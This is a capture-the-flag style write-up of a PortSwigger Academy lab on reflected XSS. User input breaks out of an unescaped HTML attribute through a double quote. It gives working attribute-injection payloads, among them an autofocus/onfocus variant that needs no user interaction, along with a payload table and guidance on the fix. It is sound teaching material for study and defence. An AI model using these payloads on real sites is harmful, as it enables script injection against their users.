# PortSwigger — Reflected XSS into Attribute with Angle Brackets HTML-Encoded

`Web Security Academy` • `Cross-Site Scripting` • `Apprentice`

## TL;DR

The search functionality reflects user input inside an HTML attribute value without encoding double quotes. Although angle brackets are HTML-encoded — preventing tag injection — the application fails to encode `"`, allowing an attacker to break out of the attribute context, inject a new event handler attribute, and execute arbitrary JavaScript. The lab is solved by injecting `" onmouseover="alert(1)` into the search field, which triggers `alert()` when the victim moves their cursor over the input.

**Lab URL:** `https://0a1500bb04ca09e081fbc67e002d0008.web-security-academy.net/`

---

## Challenge Description

> This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the `alert` function.

**Context:**
- Difficulty: **Apprentice**
- Category: **Cross-Site Scripting — Reflected**
- Goal: Inject an HTML attribute that calls `alert(1)`

---

## Recon

### Step 1 — Identify where input is reflected

Submit an arbitrary string in the search field (e.g. `hello`) and inspect the HTML response. The input is reflected in two places: inside a `<h1>` tag and inside the `value` attribute of an `<input>` element:

```html
<input type="text" placeholder="Search the blog..." name="search" value="hello">
```

This means the search term is placed **unquoted between double quotes** inside an HTML attribute — a context that is fundamentally different from being reflected inside a tag body.

### Step 2 — Test angle bracket encoding

Inject a basic XSS probe:

```
<script>alert(1)</script>
```

Inspect the response — the angle brackets are HTML-encoded:

```html
<input type="text" value="&lt;script&gt;alert(1)&lt;/script&gt;">
```

Tag injection is blocked. A classic `<script>` or `<img>` injection will not work.

### Step 3 — Test for quote encoding

Now inject a double quote followed by a space:

```
" test
```

Inspect the response:

```html
<input type="text" value="" test">
```

The double quote is **not encoded**. The injected `"` successfully closes the `value` attribute, and the word `test` lands in the tag context — as an unrecognised attribute name. This confirms that breaking out of the attribute context is possible.

---

## Understanding the Vulnerability

The HTML output template behaves like this:

```html
<input type="text" value="[USER INPUT]">
```

| Character | Encoded? | Consequence |
|---|---|---|
| `<` | ✅ Yes → `&lt;` | Cannot inject new HTML tags |
| `>` | ✅ Yes → `&gt;` | Cannot close tags |
| `"` | ❌ No | Can break out of the attribute value |

Because `"` is not sanitised, an attacker can terminate the `value` attribute early and append arbitrary HTML attributes — including JavaScript event handlers — directly onto the `<input>` element.

---

## Exploitation

### The Payload

```
" onmouseover="alert(1)
```

### What it produces in the HTML

```html
<input type="text" value="" onmouseover="alert(1)" name="search">
```

The injected `"` closes `value=""`. The string `onmouseover="alert(1)"` is then parsed as a valid HTML attribute. When the victim moves their mouse over the search input, the event fires and `alert(1)` executes.

### Step-by-step

1. Navigate to the lab URL
2. Type the following payload into the search field:
   ```
   " onmouseover="alert(1)
   ```
3. Click **Search**
4. Move the mouse cursor over the search input field
5. `alert(1)` fires → **lab solved** ✅

### Execution Flow

```
Attacker submits: " onmouseover="alert(1)
        ↓
Server reflects input into: <input value="" onmouseover="alert(1)">
        ↓
Browser parses the injected attribute as a valid event handler
        ↓
Victim hovers over the input field
        ↓
onmouseover fires → alert(1) executes
        ↓
LAB SOLVED ✅
```

---

## Alternative Payload — No User Interaction Required

For a more reliable exploit that fires automatically on page load, use the `autofocus` and `onfocus` attributes:

```
" autofocus onfocus="alert(1)
```

This produces:

```html
<input type="text" value="" autofocus onfocus="alert(1)" name="search">
```

`autofocus` causes the browser to immediately focus the input on load, which triggers `onfocus` — no mouse interaction needed.

---

## Sink and Source Summary

| | Detail |
|---|---|
| **Source** | `search` query parameter — reflected directly from the HTTP request |
| **Sink** | HTML `value` attribute of `<input>` element |
| **Missing sanitisation** | Double quote `"` is not encoded to `&quot;` |
| **XSS type** | Reflected (Non-Persistent) |

---

## XSS Context Comparison

| Injection context | Angle bracket encoding blocks tags? | Quote encoding needed? | Viable payload |
|---|---|---|---|
| Inside tag body | ✅ Yes | N/A | Blocked |
| Inside attribute value (this lab) | ✅ Yes | ❌ Missing | `" onmouseover="alert(1)` |
| Inside attribute value (fully escaped) | ✅ Yes | ✅ Yes | Blocked |
| Inside a `<script>` block | N/A | Depends on quote style | `'-alert(1)-'` |

---

## Key Takeaways

- **HTML-encoding angle brackets is not sufficient** — if the input lands inside an attribute value, the critical character to encode is `"` (to `&quot;`), not just `<` and `>`
- **Context determines the required encoding** — reflected XSS requires understanding exactly where in the HTML document the input is rendered; a single sanitisation rule cannot cover every context
- **Event handler attributes are a powerful injection vector** — any valid HTML event (`onmouseover`, `onfocus`, `oninput`, `onclick`, etc.) can be used to execute JavaScript without injecting a new tag
- **The fix:** encode all of `<`, `>`, `"`, `'`, and `&` when reflecting user input inside HTML attribute values. Using a templating engine with context-aware auto-escaping (e.g. Jinja2's `|e` filter, React JSX) eliminates this class of vulnerability entirely

---

## References

- [PortSwigger — Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
- [PortSwigger — XSS into HTML attributes](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-into-html-tag-attributes)
- [PortSwigger — XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP — XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)